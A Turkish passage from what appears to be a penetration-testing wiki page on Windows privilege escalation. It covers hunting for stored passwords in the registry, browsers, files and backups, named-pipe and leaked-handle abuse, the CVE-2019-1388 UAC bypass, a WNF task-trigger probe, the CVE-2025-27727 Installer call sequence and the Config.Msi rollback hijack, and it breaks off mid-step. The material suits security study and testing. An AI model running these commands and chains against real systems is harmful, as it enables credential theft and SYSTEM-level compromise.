Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz eden dosyaları bulmak için erişebildiğiniz Geri Dönüşüm Kutusu girdilerini kontrol edin. Kullanışlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesinden kalmış ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinmiş dosyayı ise bunun eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce meta verileri ve mevcut kimliğin okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle boş bir liste, kurtarılabilir bir yedek olmadığını kanıtlamaz. Arşiv adını, geçerli bir gizli bilgi içerdiğinin kanıtı olarak değil, incelenmesi gereken bir aday olarak değerlendirin.

Erişilebilir, silinmiş bir `.pfx` dosyası **code-signing** için de bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa bu anahtar, değiştirilmiş bir PowerShell betiğini imzalayabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları, imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için mevcut kimliğin tam olarak ilgili betiği değiştirebilmesi, etkin bir kuralın betik ve hedef hesap için oluşan imzayı kabul etmesi, ayrıca daha yüksek ayrıcalıklı bir zamanlanmış görevin veya başka bir tüketicinin bu betiği gerçekten çalıştırması gerekir. Tek başına `.pfx` dosya adı, sertifika konusu veya yazılabilir bir betik bu zinciri kanıtlamaz. Özel anahtar materyalini açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, ilkeyi ve zamanlanmış komutu inceleyin.

Kimlik bilgilerine dair ipuçları için erişebildiğiniz mesajlaşma istemcisi profil veritabanlarını, notları ve alınan dosyaları da inceleyin. Bir BitLocker kurtarma dışa aktarımı HTML veya TXT biçiminde, bazen de adlandırılmış bir yedekleme arşivinin içinde saklanabilir. Bu tür materyaller, eski yedekleri içeren ayrı bir şifreli veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa çevrimdışı etki alanı kimlik bilgilerini kurtarmak için, [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı üzere eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim, tek başına kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin varlığını kanıtlamaz.

Çeşitli programlar tarafından kaydedilmiş **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer kayıt defteri anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Registry'den openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
**Chrome, Edge veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer işaretlerini ve favorilerini de kontrol edin; bazı **parolalar** burada saklanıyor olabilir.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumundadır; `Local State` ise üst dizin olan `User Data` içindedir. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların mevcut olması yalnızca kimlik bilgisi deposu olabileceğine dair bir ipucudur: okunabilir dosyaları, ilgili kullanıcının DPAPI bağlamını veya yetkili başka anahtar materyalini ve kaydedilmiş bir oturum açma bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmak veya şifresi çözülmüş parolaları yazdırmak gerekmez.

Firefox için [Mozilla, bir profilin `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş oturum açma dosyaları olduğunu belgeliyor](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile). Bu dosyaların mevcut olması yalnızca bir ipucudur: kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce her iki dosyanın da okunabilir olup olmadığını, kayıtlı girişlerin bulunup bulunmadığını ve anahtarın Primary Password ile korunup korunmadığını kontrol edin. Kurtarılan bir kimlik bilgisi bir etki alanı hesabına aitse, bu hesabın etkin grup denetimi haklarını ve grubun [LAPS parola okuma veya şifre çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; yalnızca tarayıcı kalıntıları bir yönetici erişim yolu olduğunu kanıtlamaz.

Tarayıcılardan parola çıkarmaya yönelik araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerde yazılmış yazılım bileşenleri arasında **iletişim** kurulmasını sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **sınıf kimliği (CLSID) ile tanımlanır** ve her bileşen, arayüz kimlikleriyle (IID'ler) tanımlanan bir veya daha fazla arayüz aracılığıyla işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında registry'de tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur ve sonuç **HKEY\CLASSES\ROOT** olur.

Bu registry'nin CLSID'leri içinde, bir **DLL'yi** gösteren **varsayılan değer** ile **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilen **ThreadingModel** adlı bir değer içeren **InProcServer32** alt anahtarını bulabilirsiniz.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu registry'nin CLSID'leri içinde, bir DLL'yi gösteren varsayılan değer ile bir değer içeren InProcServer32 alt anahtarını bulabilirsiniz...](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden herhangi birinin üzerine yazabilirseniz**, bu DLL farklı bir kullanıcı tarafından çalıştırıldığında **yetki yükseltebilirsiniz**.

Saldırganların kalıcılık sağlamak için COM Hijacking'i nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve registry'de genel parola araması**

**Dosya içeriklerinde arama**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adını arayın**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Anahtar adları ve parolalar için kayıt defterinde arama yapın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir. Bu plugin'i, kurbanın içinde kimlik bilgilerini arayan her Metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne), bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, bu verileri düz metin olarak kaydeden çeşitli araçların **oturumlarını**, **kullanıcı adlarını** ve **parolalarını** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEM olarak çalışan bir process'in full access ile yeni bir process** (`OpenProcess()`) **açtığını** hayal edin. Aynı process, **ana process'in tüm açık handle'larını devralan düşük ayrıcalıklı yeni bir process de oluşturur** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e full access'iniz varsa**, `OpenProcess()` ile oluşturulan **ayrıcalıklı process'e ait açık handle'ı alabilir** ve **shellcode inject edebilirsiniz**.\
Bu zafiyetin **nasıl tespit edilip exploit edileceği** hakkında daha fazla bilgi için [bu örneği okuyun.](leaked-handle-exploitation.md)\
Farklı izin düzeyleriyle devralınan process ve thread'lere ait daha fazla açık handle'ın (yalnızca full access değil) nasıl test edilip kötüye kullanılacağına dair daha kapsamlı bir açıklama için [**bu diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşımlı bellek segmentleri, process'ler arasında iletişim ve veri aktarımı sağlar.

Windows, ilgisiz process'lerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** bulursanız, kurduğunuz pipe ile etkileşime girdiğinde o process'in kimliğini benimseyerek **daha yüksek ayrıcalıklar elde edebilirsiniz**. Böyle bir saldırının nasıl gerçekleştirileceğine dair faydalı kılavuzları [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulabilirsiniz.

Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini yakalamanızı sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Bu araç ise privesc fırsatlarını bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode'daki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) yolunu kullanıma açar. Remote bir authenticated client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach` işlemini, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya yönelik rastgele bir **4-byte write** işlemine dönüştürebilir. Ardından Telephony admin haklarını elde edip service olarak rastgele bir DLL yükleyebilir. Tam akış:

- `pszDomainUser` değerini yazılabilir, mevcut bir yol olarak ayarlayarak `ClientAttach` çağrısı yapın → service, dosyayı `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki saldırgan denetimindeki `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, ardından deterministik yazımları tekrarlamak için kaydı kaldırıp shutdown işlemini gerçekleştirin.
- `C:\Windows\TAPI\tsec.ini` dosyasındaki `[TapiAdministrators]` bölümüne kendinizi ekleyin, yeniden bağlanın ve `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` çalıştırmak için rastgele bir DLL yolu ile `GetUIDllName` çağrısı yapın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta bir şeyler çalıştırabilecek dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderers aracılığıyla Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyerek saldırgan denetimindeki dosyaları mevcut kullanıcı olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Command Line izleme**

Bir kullanıcı olarak shell aldığınızda, **command line üzerinde kimlik bilgilerini ileten** zamanlanmış görevler veya çalıştırılan başka process'ler olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak değişiklikleri çıktı olarak verir.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Süreçlerden parola çalma

## Düşük yetkili kullanıcıdan NT\AUTHORITY SYSTEM’e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows’un bazı sürümlerinde ayrıcalıksız bir kullanıcı olarak terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir süreci çalıştırmak mümkündür.

Bu sayede aynı güvenlik açığıyla hem ayrıcalıkları yükseltmek hem de UAC’yi atlatmak mümkündür. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan ikili dosya Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları gerçekleştirmek gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

GitHub deposunda gerekli tüm dosyalar ve bilgiler mevcut:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypasses** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junctions

Bir uygulama tahmin edilebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı bir dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp NTFS junction ile değiştirebiliyorsa, yazma işlemi junction'ı izleyerek web sunucusunun sunduğu bir dizine ulaşabilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya konulan bir script web-service kimliğiyle çalışabilir. Bu, uygulamaya özgü bir arbitrary-write sınırıdır; yazılabilir bir upload dizini veya mevcut bir junction tek başına bunu kanıtlamaz.

Upload handler'daki tam path oluşturma mantığını ve zamanlamasını, kullanıcının alt dizindeki etkin silme/oluşturma izinlerini, hedefin etkin ACL'lerini, yazıcı işlemin reparse point'leri izleyip izlemediğini ve web sunucusunun hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazıcı ve web sunucusu işlemlerinin kimliklerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak handler'ın davranışını veya gelecekte yapılacak bir junction değişimini ortaya koyamaz. Çalıştırma bir service account kimliğiyle gerçekleşirse, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ını** inceleyin.

## WNF ile tetiklenen ayrıcalıklı scheduled-task temizliği

Elle çalıştırmayı reddeden bir scheduled task yine de ayrıcalıksız bir tetikleme yöntemi sunabilir. Ayrıcalıklı bir task'ı denetlerken XML'ini dışa aktarın ve task DACL'sinin, principal'ının ve action'ının yanı sıra **tüm** trigger'ları inceleyin. Özellikle bir `WnfStateChangeTrigger`, Windows Notification Facility (WNF) state'ini belirtir; bu güvenlik uygulanabilir state mevcut kullanıcının güncelleme yayımlamasına izin veriyorsa, kullanıcı `<AllowStartOnDemand>false</AllowStartOnDemand>` ayarına rağmen task'ı yapılandırılmış kimliğiyle dolaylı olarak başlatabilir.<sup>[[43]](#references)</sup>

Örneğin, Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task'ı SYSTEM olarak çalışıyor, standart bir kullanıcının WNF state `7508BCA32C079E41` için güncelleme göndermesini kabul ediyor ve Recall devre dışı olsa bile `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` dizinini inceliyordu.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Erişilebilirliği test etmek için `ZwUpdateWnfStateData` işlevini `ntdll.dll` içinden çözümleyin, sekiz baytlık durum adı için boş bir güncelleme gönderin ve dönüş durumunu görevin son çalıştırılma verileriyle veya Procmon etkinliğiyle ilişkilendirin. Aşağıdaki basitleştirilmiş prob, Recall görevi örneğindeki bayt dizisini kullanır; test edilen görev için dışa aktarılan baytları kullanın.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Özyinelemeli temizliği ayrıcalıklı silmeye dönüştürme

Kullanışlı primitive yalnızca tetikleyici değil, saldırganın denetimindeki bir dizini kabul eden ayrıcalıklı bir temizleme yordamıdır. İşlemi numaralandırmadan son değişikliğe kadar izleyin: profil/oturum keşfi, joker karakterlerle seçilen alt öğeler, `SHCreateItemFromParsingName` ve `IFileOperation::DeleteItem`, daha önce denetlenmiş bir yol adının daha sonra özyinelemeli olarak izleneceğine dair güçlü göstergelerdir. Alt öğeler güvenilir dizin tanıtıcılarına göre açılıp silinmeden önce doğrulanmıyorsa, saldırgan numaralandırma ile kullanım arasındaki çözümlemeyi değiştirebilir.<sup>[[43]](#references)</sup>

WNF tetikleyicisini aşağıda açıklanan [oplock, junction ve Object Manager symlink ikamesiyle](#from-folder-contents-delete-to-system-eop) birleştirin: oplock, temizleyici meşru alt öğeyi seçtikten sonra işlemi duraklatırken yazılabilir üst dizin değiştirilir; böylece ayrıcalıklı silme işlemi devam ettiğinde `\RPC Control` üzerinden korunan hedefe yönlendirilir. Recall zincirinde bu, belgelenmiş MSI rollback tekniği için gereken `C:\Config.Msi` dizininin SYSTEM tarafından silinmesini sağladı.<sup>[[31]](#references)[[43]](#references)</sup>

### İç içe alt öğeler, yüzeysel reparse-point düzeltmelerini aşar

Yalnızca saldırganın denetimindeki kökü ve doğrudan alt öğesini doğrulamak, yol adına dayalı özyinelemeli silme işlemini güvenli hâle getirmez. Bu denetlenmiş nesneleri meşru tutun ve junction/oplock ikamesini bunların altındaki başka bir alt öğeye taşıyın; `IFileOperation::DeleteItem` sonunda doğrulanmamış alt öğeye ulaşır ve onun yeni hedefini izler. CVE-2026-20941, ilk Recall yaması `UKP` ve GUID biçimli dizini doğrularken eski özyinelemeli silme işlemini koruduğu için tam olarak bu tür eksik bir düzeltmeden kaynaklandı.<sup>[[43]](#references)</sup>

Güvenli yöntem, **her alt öğeyi** önceden güvenilen bir dizin tanıtıcısına göre açmak, çözümlenen son yolu/nesneyi alıp doğrulamak ve silme disposition'ını bu doğrulanmış tanıtıcıya uygulamaktır. Bir öneki doğrulayıp ardından yeniden yol adına dayalı özyinelemeli silme işlemine dönmeyin. Yama incelemesi sırasında gerçek çağrı noktasındaki yapıları da inceleyin: bu durumda `NtCreateFile` içindeki `OBJECT_ATTRIBUTES` yapısının çalışma zamanında incelenmesi, `RootDirectory` alanının null olmadığını ve `{GUID}\\secure_file.lock` adının göreli olduğunu göstererek, ikinci bir `FILE_DELETE_ON_CLOSE` primitive'i olduğunu öne süren yanıltıcı decompiler çıktısını çürüttü.<sup>[[43]](#references)</sup>

## İstediğiniz Klasörü Silme/Taşıma/Yeniden Adlandırmadan SYSTEM EoP'ye

[**Bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan, exploit kodu [**burada mevcut**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) olan teknik.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, kaldırma işlemi sırasında meşru dosyaları zararlı dosyalarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek amacıyla kullanılacak bir **zararlı MSI installer** oluşturması gerekir. Windows Installer daha sonra bu klasörü diğer MSI paketlerini kaldırırken rollback dosyalarını saklamak için kullanır; bu dosyalar, zararlı payload'ı içerecek şekilde değiştirilmiş olur.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) üzerinden SYSTEM olarak çalışan `msiexec.exe` servisine erişebilir. Tersine mühendislik, ilgili `IMsiServer` çağrılarının vtable'daki `0xA0` ofsetinde `MsiBeginTransactionW`, `0xC8` ofsetinde `SetEEUIDirectoryAndFilter` ve `0x50` ofsetinde `CleanupTempPackages` olduğunu ortaya çıkardı. Bu adlar ve ofsetler tersine mühendislikle belirlenmiştir ve farklı build'lerde değişiklik gösterebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, yalnızca sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken çağıranı impersonate eder. Bu, çağıranın dizini silebildiğini kanıtlar ve bir reparse point'in izlenmesini önler; ancak denetlenen file object'i sonraki temizleme işlemine bağlamaz veya bu nesnenin Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` çağrısından sonra `SetEEUIDirectoryAndFilter`, çağıranın filter argümanından bağımsız olarak yolu klasör olarak zamanlar. Servis, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın denetimindeki yoldur ve `0x00000002` verisi klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` doğrudan temizleme işlemine girer. Yükseltilmiş yetkilerle çalışan işçi, kayıt defteri değerlerini numaralandırır ve klasör girdilerini yolun kaynağını denetlemeden özyinelemeli `FDeleteFolder` yordamına iletir. Normal kaldırma başarısız olursa kod ayrıca `LockdownPath` çağırır, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından çıkarılan asgari çağrı dizisi şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi yerine path reuse kullanmaktır. Saldırganın oluşturduğu `C:\Config.Msi` dizinini kaydedin, silin ve Windows Installer’ın daha sonra korumalı rollback verileriyle aynı path’i yeniden oluşturmasını sağlayın. Temizleme işlemi, eski `TempPackages` adına güvenerek yeni dizini SYSTEM olarak siler. Reparse point gerekmediğinden bu yöntem, `FILE_FLAG_OPEN_REPARSE_POINT` ve yönlendirme güveni azaltımının amaçlanan sınırını aşar.<sup>[[41]](#references)</sup>

Bu silme primitive’i aşağıdaki rollback zincirine uyar: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve installer DACL’yi sıkılaştırmadan önce `WRITE_DAC` izni verilmiş bir handle’ı açık tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin verici bir DACL’yi geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkin olduğunda `CMsiTransaction::SetEEUIDirectoryAndFilter` metodunun `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu yolu düzeltti. COM çağrısı yine de başarı döndürebilir, ancak saldırganın denetimindeki path’i artık `TempPackages` içine eklemez. Yama testi olarak metodun başarılı dönüşünü kullanmak yerine Nisan 2025 Windows güvenlik güncellemelerini yükleyin.<sup>[[41]](#references)[[42]](#references)</sup>

Özetlenen teknik şöyledir:

1. **Aşama 1 – Hijack için hazırlık (`C:\Config.Msi` dizinini boş bırakın)**

- Adım 1: MSI’ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Yönetici olmayan bir kullanıcının** çalıştırabilmesi için installer’ı **"UAC Compliant"** olarak işaretleyin.
    - Yükleme sonrasında dosyanın **handle**’ını açık tutun.

- Adım 2: Uninstall işlemini başlatın
    - Aynı `.msi`’ı uninstall edin.
    - Uninstall işlemi dosyaları `C:\Config.Msi` dizinine taşımaya ve `.rbf` dosyalarına (rollback yedekleri) yeniden adlandırmaya başlar.
    - Dosya `C:\Config.Msi\<random>.rbf` olduğunda tespit etmek için açık dosya handle’ını **`GetFinalPathNameByHandle` kullanarak yoklayın**.

- Adım 3: Özel senkronizasyon
    - `.msi`, şu işlemleri yapan bir **özel uninstall action (`SyncOnRbfWritten`)** içerir:
        - `.rbf` yazıldığında sinyal verir.
        - Ardından uninstall işlemine devam etmeden önce başka bir event’i **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Sinyal geldiğinde, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın **silinmesini engeller**.
    - Ardından uninstall işleminin tamamlanabilmesi için karşı tarafa **sinyal gönderin**.
    - Windows Installer `.rbf` dosyasını silemez; tüm içerikleri silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - Siz (saldırgan) `.rbf` dosyasını elle silin.
    - Artık **`C:\Config.Msi` boştur** ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM düzeyindeki rastgele klasör silme açığını tetikleyin**.

2. **Aşama 2 – Rollback script’lerini kötü amaçlı olanlarla değiştirme**

- Adım 6: `C:\Config.Msi` dizinini zayıf ACL’lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL’ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` iznine sahip bir handle’ı **açık tutun**.

- Adım 7: Başka bir yükleme çalıştırın
    - `.msi`’ı şu ayarlarla tekrar yükleyin:
        - `TARGETDIR`: Yazılabilir konum.
        - `ERROROUT`: Zorunlu bir hatayı tetikleyen değişken.
    - Bu yükleme, `.rbs` ve `.rbf` dosyalarını okuyan **rollback’i** yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` dosyası görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını kaydedin.

- Adım 9: Rollback öncesinde senkronize edin
